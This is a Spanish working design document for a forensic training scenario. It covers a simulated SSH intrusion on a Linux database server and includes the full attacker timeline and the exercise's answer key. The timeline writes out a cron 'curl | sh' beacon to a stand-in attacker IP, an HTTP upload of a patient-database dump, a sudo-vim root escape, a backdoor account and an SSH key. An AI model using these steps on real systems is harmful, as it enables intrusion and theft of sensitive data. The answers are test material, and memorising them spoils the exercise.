---
tags:
  - DFIR/Simulacion
  - DFIR/Linux
estado: fase 3 (validado en frío)
---

# Diseño — Escenario 02: compromiso de `db01` por SSH

Documento de trabajo. Contiene las respuestas, así que no es material para quien vaya a resolver el caso. Gobierna el generador: todo lo que aparezca en las evidencias tiene que salir de esta línea temporal, y nada que no esté aquí debería aparecer.

## Premisa

Una semana después de la intrusión en el portal (escenario 01), IT rotó las contraseñas del panel pero **no la de la base de datos**. En `db01` existe además una cuenta de sistema `portal_app`, creada por la DBA para los scripts de despliegue, **con la misma contraseña** que el usuario de MariaDB. El cortafuegos del proveedor reenvía `TCP/2222` público hacia `db01:22` para que la DBA pueda hacer mantenimiento remoto. El atacante, que ya tenía la credencial y la lista de usuarios de `web01`, vuelve por ahí.

El caso se resuelve solo con sus evidencias. La relación con el 01 es una pregunta de contexto, no un requisito.

## Activos

| Activo | IP | Rol |
| --- | --- | --- |
| `db01.kelbrook.internal` | `10.20.30.20` | Ubuntu 22.04.5, MariaDB 10.6, OpenSSH 8.9p1. Víctima. Zona horaria UTC |
| `web01` | `10.20.30.10` | Portal web. Cliente MySQL constante contra `db01` (ruido) |
| `nas01` | `10.20.30.40` | NAS de copias. Recibe el backup nocturno por rsync/SSH (ruido) |
| `ws-it-02` | `10.20.30.55` | Puesto Windows de la DBA. PuTTY 0.76 con clave ed25519, puertos origen 49152-65535 (ruido) |
| `dns01` | `10.20.30.2` | Resolvedor interno |
| `fw01` | `10.20.30.1` | Cortafuegos/puerta de enlace. NAT `2222 → 10.20.30.20:22` |
| Atacante | `198.51.100.212` | VPS distinto al del escenario 01 (`198.51.100.37`). Cliente `OpenSSH_8.4p1 Debian-5+deb11u3`. Sirve HTTP en `8080` (`BaseHTTP/0.6 Python/3.11.2`) |
| Escáner | `203.0.113.77` | Fuerza bruta de fondo con `libssh2_1.10.0`. **No** es el atacante |
| Escáner 2 | `203.0.113.140` | 8 intentos a las 04:12, fuera de la captura. Solo en `auth.log` y `btmp` |

Cuentas en `db01` antes del incidente:

| Usuario | UID | Notas |
| --- | --- | --- |
| `root` | 0 | Contraseña bloqueada, sin clave SSH autorizada. `PermitRootLogin prohibit-password` |
| `backup` | 34 | Cuenta de sistema de Ubuntu. Ejecuta `/usr/local/bin/db-backup.sh` por cron a las 23:00 |
| `kbadmin` | 1000 | Cuenta de instalación del proveedor. Último acceso en agosto de 2025 |
| `mvega` | 1001 | Marta Vega, DBA. Grupo `sudo`. Login por clave desde `ws-it-02` |
| `portal_app` | 1002 | Cuenta de despliegue. Contraseña `Kb!portal#2024` (reutilizada de MariaDB). La DBA la usó el 18/09 para un despliegue |
| `jnavarro` | 1003 | Excontratista. Bloqueada (`!` en `shadow`) desde el 30/06/2026. Distractor |

Configuración relevante:

- `/etc/sudoers.d/portal_app`: `portal_app ALL=(root) NOPASSWD: /usr/bin/vim /etc/mysql/mariadb.conf.d/*`. Lo dejó la DBA para que el despliegue pudiera ajustar la configuración sin pedirle a ella. Es la vía de escalada.
- Bloque añadido al final de `/etc/bash.bashrc`: `HISTTIMEFORMAT="%F %T "`, `HISTSIZE=5000`, `shopt -s histappend`. Va en `bash.bashrc` y no en `profile.d` porque la shell que sale de vim no es de login. Así todos los historiales llevan marcas de tiempo, también el de root.
- `/etc/cron.d/sysstat` viene de serie y se dispara cada 10 minutos (`5-55/10`). Es el ruido que se confunde con el cron malicioso.
- Sin fail2ban. El escáner acumula cientos de fallos sin bloqueo (hallazgo de remediación).
- Bases de datos: `kb_portal` (la del portal) y `kb_clinica` (`pacientes` con 1 240 filas, `citas` 3 180, `historias` 2 075, `medicos` 12).

## Línea temporal

Todas las horas en UTC. Ventana de la captura: **2026-09-29 22:00 → 2026-09-30 03:00**. El triage del host se recoge el 30 a las 08:30.

### Ruido legítimo

| Hora | Evento | Dónde se ve |
| --- | --- | --- |
| 22:00 – 03:00 | `web01` consulta MariaDB en `db01:3306` de forma continua, varias conexiones por minuto | PCAP |
| 22:00 – 03:00 | Consultas DNS de `db01` a `dns01` (NTP, apt, `nas01`) y NTP a `203.0.113.5` | PCAP |
| 22:03:10 – 22:17:48 | `mvega` entra por SSH con clave desde `ws-it-02`, revisa MariaDB y el disco, usa `sudo mysql` con contraseña, sale | `auth.log` (publickey y `sudo`), `wtmp`, `.bash_history` de `mvega`, PCAP |
| 23:00:01 – 23:03:29 | Cron de `backup`: `mysqldump`, consulta DNS de `nas01.kelbrook.internal` y `rsync` por SSH a `nas01`. Termina con `logger -t db-backup` | `syslog.1` (CRON y `db-backup`), `auth.log` (sesión de cron), PCAP (SSH saliente a `10.20.30.40:22`, 2,4 MB) |
| 23:41:10 – 00:36:22 | Escáner `203.0.113.77`: 192 intentos, uno por conexión, contra `root`, `admin`, `ubuntu`, `test`, `oracle`, `pi`... Cadencia de 15 a 20 s, banner `libssh2_1.10.0`, se despide con `Bye Bye` | `auth.log`, `btmp`, PCAP |
| Todo el periodo | Fondo de escaneo de otras IPs desde el 1 de septiembre, entre 2 y 14 intentos por ráfaga | `btmp` (todo el mes), `auth.log` (desde el 27) |

### Intrusión

| Hora | Evento | Dónde se ve |
| --- | --- | --- |
| 01:02:10 – 01:02:51 | Desde `198.51.100.212`, cinco fallos de contraseña: `root` (x2), `nhollis`, `deploy`, `admin`. `nhollis` y `deploy` existían en `web01`, no en `db01`: `auth.log` los marca como `Invalid user` | `auth.log`, `btmp` |
| 01:03:05 | `Accepted password for portal_app from 198.51.100.212 port 51734 ssh2`. Sesión 313 de logind en `pts/0` | `auth.log`, `wtmp`, `lastlog` |
| 01:03 – 01:09 | Reconocimiento: `id`, `hostname`, `uname -a`, `cat /etc/os-release`, `cat /etc/passwd`, `sudo -l` (01:05:41), `ss -tlnp`, `ps aux`, `ls -la /etc/mysql/mariadb.conf.d/`, `cat /etc/sudoers.d/portal_app` (denegado) | **Se pierde**: el historial de `portal_app` se borra. Sobrevive `COMMAND=list` en `auth.log`; en el PCAP solo se ven ráfagas de pulsaciones y respuestas |
| 01:10:18 | `sudo /usr/bin/vim /etc/mysql/mariadb.conf.d/50-server.cnf`; a las 01:10:27 escapa con `:!/bin/bash`. Todo lo siguiente corre como `root` en una shell hija de vim | `auth.log` (`sudo: portal_app : TTY=pts/0 ; ... ; COMMAND=/usr/bin/vim ...`), `/root/.viminfo` (`:!/bin/bash`), `/root/.bash_history` desde 01:10:31 |
| 01:11 – 01:14 | Como root: `id`, `cat /etc/shadow`, `mysql -e 'SHOW DATABASES'`, `mysql -e 'SELECT COUNT(*) FROM kb_clinica.pacientes'` | `/root/.bash_history` |
| 01:15:02 – 01:15:19 | `useradd -m -s /bin/bash -G sudo support`; `passwd support` (contraseña `Soporte2026!`) | `auth.log` (`useradd` crea grupo y usuario 1004 y lo añade a `sudo`; `passwd` a las 01:15:19), `/etc/passwd`, `/etc/shadow`, `/etc/group`, `/home/support/` sin historial |
| 01:16:05 – 01:16:31 | `mkdir -p /root/.ssh`, `echo 'ssh-ed25519 AAAA... ops@kelbrook-backup' >> /root/.ssh/authorized_keys` (pegado de una vez), `chmod 600` | `/root/.bash_history`, el fichero (mtime 01:16:20), `live/stat.txt` (Change 01:16:31) |
| 01:17:40 | `/etc/cron.d/mariadb-health` con `*/10 * * * * root curl -s http://198.51.100.212:8080/c/$(hostname) \| sh` | `/root/.bash_history`, el fichero, `syslog` (`cron[812]: (*system*mariadb-health) RELOAD` a las 01:18:01) |
| 01:20:01 en adelante | Primer disparo y sucesivos cada 10 minutos: `GET /c/db01`, respuesta 200 vacía. 10 en la captura, 43 hasta el triage | `syslog` (CRON), `auth.log` (sesiones de cron de root en minutos :00), PCAP (HTTP en claro, `curl/7.81.0`) |
| 01:20:40 – 01:23:10 | `mkdir /var/tmp/.font-cache`, `mysqldump kb_clinica > ...kb_clinica.sql` (termina 01:21:00), `cd`, `tar czf kb_clinica.tgz kb_clinica.sql` | `/root/.bash_history`; dentro del `.tgz`, `kb_clinica.sql` con mtime 01:21 |
| 01:24:05 | `curl -F 'f=@kb_clinica.tgz' http://198.51.100.212:8080/up`. Cabeceras con `Expect: 100-continue`; el servidor HTTP/1.0 no contesta 100 y curl manda el cuerpo un segundo después | PCAP: `POST /up` multipart, `Content-Length: 120042`; fichero `kb_clinica.tgz` de 119 839 bytes, extraíble y con 1 240 pacientes |
| 01:25:30 | `rm -rf /var/tmp/.font-cache` | `/root/.bash_history`; `/var/tmp` tiene mtime 01:25:30 en el tar, en `live/stat.txt` y en `live/ls-tmpdirs.txt` |
| 01:26:12 – 01:26:19 | `exit` de la shell root, Enter y `:q!` en vim. Cierra la sesión de sudo | `/root/.bash_history`; `/root/.viminfo` (mtime 01:26); `auth.log` (`session closed for user root` 01:26:19); `50-server.cnf` conserva el mtime de 2025 |
| 01:26:52 – 01:27:02 | En la shell de `portal_app`: `history -c` y `exit` | El `.bash_history` de `portal_app` acaba en el despliegue del 18/09 seguido de un `exit` suelto con marca 01:27:02. `history -c` vacía la memoria, pero el `exit` posterior sí se guarda |
| 01:27:03 | Cierre de sesión. Duración 23 min 58 s | `auth.log` (`session closed`, `Disconnected`), `wtmp` |
| 02:05:17 – 02:07:02 | `Accepted publickey for root from 198.51.100.212 port 51902 ssh2: ED25519 SHA256:iYfVQlxqXPJvDFbBtP7mEnM+VWT2i7nyo+aem9s2R+Q`. `id`, `crontab -l`, `cat` del cron, `tail` de `passwd`, `w`, sale | `auth.log`, `wtmp`, `lastlog`, `/root/.bash_history` (segundo bloque) |

### Qué pasa después (fuera de las evidencias)

El cron sigue llamando cada 10 minutos. A las 04:12 pasa otro escáner (8 intentos). A las 08:04:37 la DBA entra desde `ws-it-02`, ve el cron y a las 08:27:50 lanza `sudo /bin/bash /tmp/ir-collect.sh`, que recoge el triage a las 08:28:12. Su sesión sigue abierta: en `wtmp` aparece sin cierre y en `live/who.txt` como conectada. Distinguir la huella del propio equipo de respuesta es parte del ejercicio. El escenario queda abierto para un posible 03.

## Mapa ATT&CK

| Fase | Técnica | Evidencia que la sostiene |
| --- | --- | --- |
| Acceso inicial | T1078.003 Valid Accounts: Local Accounts | `Accepted password for portal_app` |
| Acceso inicial | T1110.001 Brute Force: Password Guessing (ruido del escáner y los 5 fallos del atacante) | `btmp`, `auth.log` |
| Descubrimiento | T1033, T1082, T1087.001, T1049 | `sudo -l` en `auth.log`; historial de root |
| Escalada | T1548.003 Abuse Elevation Control Mechanism: Sudo | Línea `sudo ... COMMAND=/usr/bin/vim`, `/etc/sudoers.d/portal_app` |
| Credenciales | T1003.008 /etc/passwd and /etc/shadow | Historial de root |
| Persistencia | T1136.001 Create Account: Local Account | `useradd` en `auth.log`, `/etc/passwd` |
| Persistencia | T1098.004 Account Manipulation: SSH Authorized Keys | `/root/.ssh/authorized_keys`, login `publickey` a las 02:05 |
| Persistencia / C2 | T1053.003 Scheduled Task: Cron | `/etc/cron.d/mariadb-health`, `syslog`, PCAP |
| Recolección | T1005, T1560.001 Archive via Utility | Historial de root |
| Exfiltración | T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol | `POST /up` en el PCAP |
| Evasión | T1070.003 Clear Command History, T1070.004 File Deletion | `.bash_history` vacío de `portal_app`; `rm -rf` del staging |

## Evidencias que se entregan

```
02_Linux_SSH_Compromise/
├── Escenario.md
├── Solucion.md                       (fase 4)
├── generar_escenario.py
├── captura/
│   └── vlan-datos-2026-09-29.pcap    22:01 → 02:56, ~16 000 paquetes, 4,6 MB
└── triage/
    └── db01-triage-2026-09-30.tar.gz
```

Contenido del tar (`db01-triage-2026-09-30/`), con los mtimes, modos y propietarios de la línea temporal:

```
fs/etc/      passwd shadow group gshadow sudoers sudoers.d/{README,portal_app} crontab
             cron.d/{e2scrub_all,sysstat,db-backup,mariadb-health} ssh/sshd_config
             bash.bashrc mysql/mariadb.conf.d/50-server.cnf os-release hostname
fs/root/     .bash_history .viminfo .ssh/authorized_keys
fs/home/     mvega/{.bash_history,.ssh/authorized_keys} portal_app/.bash_history
             jnavarro/.bash_history support/{.bashrc,.profile,.bash_logout}
fs/var/log/  auth.log (desde la rotación del 27/09) syslog.1 (29/09) syslog (30/09)
             wtmp btmp lastlog (binarios, todo septiembre)
fs/var/tmp/  (solo el directorio, para conservar su mtime)
fs/usr/local/bin/db-backup.sh
live/        date.txt who.txt ps-auxf.txt ss-tanp.txt ls-tmpdirs.txt stat.txt
manifest.sha256
```

Lo que **no** se entrega, a propósito: imagen de disco, journal binario, el contenido de `/var/backups`. El escenario es de triage rápido, no de imagen completa.

Herramientas comprobadas sobre las evidencias generadas: `tshark` 4.2 (sin paquetes malformados ni avisos de experto), `last -f`, `lastb -f`, `utmpdump`, `lastlog -R`, `tar`, `--export-objects http`.

## Trampas pensadas

1. **El escáner.** `203.0.113.77` tiene cuarenta veces más fallos que el atacante. Quien filtre por "la IP con más fallos" se equivoca de hilo. Se distingue por cadencia (metronómica frente a humana), por los usuarios probados (genéricos frente a nombres de la organización) y porque nunca consigue un `Accepted`.
2. **La IP cambia respecto al 01.** No se puede unir por IP. Se une por la cuenta `portal_app` y por los usuarios `nhollis` y `deploy`, que solo tienen sentido si el atacante leyó el `/etc/passwd` de `web01`.
3. **Historial borrado pero no del todo.** `portal_app` no deja rastro en su `.bash_history`; root sí, porque la shell escapada de vim es otro proceso con otro historial.
4. **Tráfico saliente legítimo.** El rsync a `nas01` mueve mucho más volumen que la exfiltración. El tamaño no es señal; el destino, sí.
5. **`50-server.cnf` intacto.** El `sudo vim` no modificó el fichero. Quien busque cambios en la configuración de MariaDB no encontrará nada: el editor fue el vehículo, no el objetivo.
6. **Dos crons cada 10 minutos.** `sysstat` corre en los minutos 5, 15, 25...; el malicioso en 0, 10, 20... Contar sesiones de cron de root en `auth.log` sin mirar el `CMD` de `syslog` mezcla ambos.
7. **La huella propia.** El `sudo` de las 08:27:50 y la sesión abierta de `mvega` son del equipo de respuesta, no del atacante.
8. **HASSH.** Atacante, escáner, DBA y backup usan clientes SSH distintos. El banner y el HASSH separan los hilos aunque el tráfico vaya cifrado.

## Preguntas (16)

Se copian a `Escenario.md`. Respuesta esperada entre paréntesis, solo aquí.

1. ¿Qué usuario, desde qué IP y a qué hora consiguió el atacante su primer acceso interactivo a `db01`? (`portal_app`, `198.51.100.212`, 01:03:05)
2. Antes de entrar, probó otros cuatro nombres de usuario. ¿Cuáles, y cuáles de ellos no existían en `db01`? (`root`, `nhollis`, `deploy`, `admin`; no existen `nhollis`, `deploy` ni `admin`)
3. Otra IP acumula muchos más fallos de autenticación. ¿Cuál es, cuántos intentos hizo y por qué no es el atacante? (`203.0.113.77`, 192, nunca entra, usuarios genéricos, cadencia automática, cliente `libssh2`)
4. ¿Qué relación tiene este acceso con el incidente del 23 de septiembre en `web01`? (credencial `Kb!portal#2024` reutilizada en la cuenta de sistema `portal_app`; `nhollis` y `deploy` salen del `/etc/passwd` de `web01`)
5. ¿Cómo pasó el atacante de `portal_app` a `root`? Cita la línea de `auth.log` y el otro artefacto que muestra cómo obtuvo la shell. (`sudo ... COMMAND=/usr/bin/vim /etc/mysql/mariadb.conf.d/50-server.cnf` a las 01:10:18; `:!/bin/bash` en `/root/.viminfo`)
6. ¿Qué configuración lo hizo posible y en qué fichero está? (`/etc/sudoers.d/portal_app`, vim sin contraseña como root sobre esa ruta)
7. ¿Qué cuenta nueva se creó, con qué UID, en qué grupo y a qué hora? (`support`, 1004, `sudo`, 01:15:02)
8. ¿Qué clave SSH se añadió, a qué cuenta, cuál es su comentario y dónde se usa después? (ed25519 en `/root/.ssh/authorized_keys`, `ops@kelbrook-backup`, huella `SHA256:iYfVQlx...` en el `Accepted publickey` de las 02:05:17)
9. ¿Qué mecanismo de ejecución periódica dejó, cada cuánto se dispara y a dónde conecta? (`/etc/cron.d/mariadb-health`, cada 10 min, `http://198.51.100.212:8080/c/db01`)
10. ¿A qué hora se ejecutó por primera vez y cuántas veces aparece en la captura? (01:20:01, 10 veces; 43 en `syslog` hasta el triage)
11. ¿Qué datos se sacaron de `db01`, por qué protocolo, hacia dónde y cuánto ocupaba el fichero? (`kb_clinica.tgz`, HTTP POST multipart en claro a `198.51.100.212:8080/up`, 119 839 bytes; `Content-Length` 120 042)
12. ¿Cuántos pacientes contiene el volcado exfiltrado? (1 240)
13. ¿Dónde preparó el atacante los ficheros antes de sacarlos y qué hizo con ese directorio? (`/var/tmp/.font-cache`, `rm -rf` a las 01:25:30; el mtime de `/var/tmp` lo delata)
14. El historial de `portal_app` apenas muestra nada de esa noche. ¿Qué queda, por qué, y qué fuentes reconstruyen lo que hizo? (un `exit` suelto a las 01:27:02 tras `history -c`; `auth.log`, `wtmp`, `.viminfo`, `/root/.bash_history`)
15. ¿Cuánto duró la sesión inicial, cuándo volvió y con qué método se autenticó la segunda vez? (23 min 58 s; 02:05:17, `publickey` como `root`)
16. En la captura hay una transferencia SSH saliente de `db01` mucho mayor que la exfiltración. ¿Qué es y cómo se descarta? (backup por rsync a `nas01` a las 23:03, lanzado por `/etc/cron.d/db-backup`, con el `logger` de `db-backup` en `syslog.1`)

Extra (difícil):

17. ¿Qué contraseña asignó el atacante a `support`? (`Soporte2026!`; yescrypt de `/etc/shadow` con John `--format=crypt` y una lista corta)
18. Sin descifrar nada, ¿cómo separas en la captura al atacante, al escáner y a la DBA? (banner y HASSH: atacante `OpenSSH_8.4p1 Debian-5+deb11u3` / `c11b200866cf918393e62ea25d851d90`; escáner `libssh2_1.10.0` / `b4b8ae3d7241d2c1dc54b4df7e8c19d1`; DBA `PuTTY_Release_0.76` / `59e381f5af200c31d0b53cf5f2ea6518`. Además la duración, el volumen y el ritmo de cada conexión)

Entregable sugerido: línea temporal, IOCs (IP, huella de la clave, ruta del cron, cuenta `support`, staging), lista de persistencias a eliminar y tres recomendaciones.

## Decisiones tomadas en la fase 2

- **Clientes SSH.** Atacante con OpenSSH 8.4 (Debian 11) y DBA con PuTTY 0.76, ambos negociando curve25519. Wireshark 4.2 no reconoce el tamaño de clave del KEX híbrido sntrup761 y marcaría error.
- **PIDs y puertos.** Se reparten al final en orden cronológico, desde el arranque del 14/09, para que nunca retrocedan aunque el generador cree los eventos fuera de orden.
- **`/etc/shadow`.** Hashes yescrypt reales (formato por defecto de Ubuntu 22.04). La contraseña de `support` (`Soporte2026!`) cae con una lista corta y John; las demás son fuertes.
- **Exfiltración en claro.** Deliberado para que el `.tgz` sea recuperable. Un escenario posterior puede hacerla por TLS.
- **Tamaño.** El backup se simula con 2,4 MB de carga cifrada; la captura queda en 4,6 MB y el triage en 50 KB.
- **Pistas.** Las preguntas 2 y 16 conservan las pistas; se revisan en la fase 3.

## Resultado de la fase 3

Resolución en frío solo con las evidencias y herramientas estándar (`grep`, `last`, `lastb`, `utmpdump`, `lastlog -R`, `tshark`, `tar`, `sha256sum`). Las 16 preguntas tienen respuesta única y cada una se demuestra con al menos dos fuentes.

| Pregunta | Fuente principal | Corroboración |
| --- | --- | --- |
| 1, 2, 15 | `auth.log` | `wtmp`, `btmp`, `lastlog`, PCAP (puertos origen) |
| 3 | `auth.log` | `btmp` (192 en ambos), PCAP (HASSH de libssh2) |
| 4 | `etc/shadow` (el hash de `portal_app` verifica con `Kb!portal#2024`) | usuarios del `/etc/passwd` de `web01` en `btmp` |
| 5, 6 | `auth.log` (`COMMAND=/usr/bin/vim`) | `/root/.viminfo`, `sudoers.d/portal_app` |
| 7, 8, 9, 13 | `/root/.bash_history` | `auth.log`, ficheros y sus mtimes, `live/stat.txt` |
| 10 | `syslog` (43 ejecuciones) | PCAP (10 `GET /c/db01`) |
| 11, 12 | PCAP (`POST /up`) | `/root/.bash_history` |
| 14 | `home/portal_app/.bash_history` | `auth.log`, `wtmp` |
| 16 | PCAP (2,4 MB a `nas01`) | `cron.d/db-backup`, `syslog.1` |

Correcciones aplicadas al generador tras la validación:

- **Directorios del tar.** Iban todos al principio y GNU tar no restauraba su mtime al extraer. Ahora cada directorio precede a su contenido, se incluyen los intermedios y llevan fechas coherentes (`/etc` 01:15:19, `/root` 01:26:19, `/var/log` en la rotación).
- **Rotación de `syslog`.** Los ficheros se cortan en el HUP de rsyslog, como en un sistema real.
- **Puertos de PuTTY.** Rango de Windows y crecientes en el tiempo; coinciden con `auth.log` y con `live/ss-tanp.txt`.
- **Distractor no diseñado.** El escáner probaba `support1`, demasiado parecido a la cuenta del atacante; ahora prueba `debian`.

Dificultad: se mantiene en Media. El historial de root lo da casi todo, como pasa a menudo en la realidad. La dificultad está en las correlaciones: el `.viminfo`, el `exit` suelto, la trampa de sysstat, recortar el multipart y verificar el hash. Se conservan las pistas de las preguntas 2 y 16 y se añaden dos preguntas extra de nivel Difícil.

Pendiente para la fase 4: este documento contiene las respuestas y vive junto al brief. Al escribir `Solucion.md` conviene integrarlo allí o moverlo fuera de la carpeta del escenario.
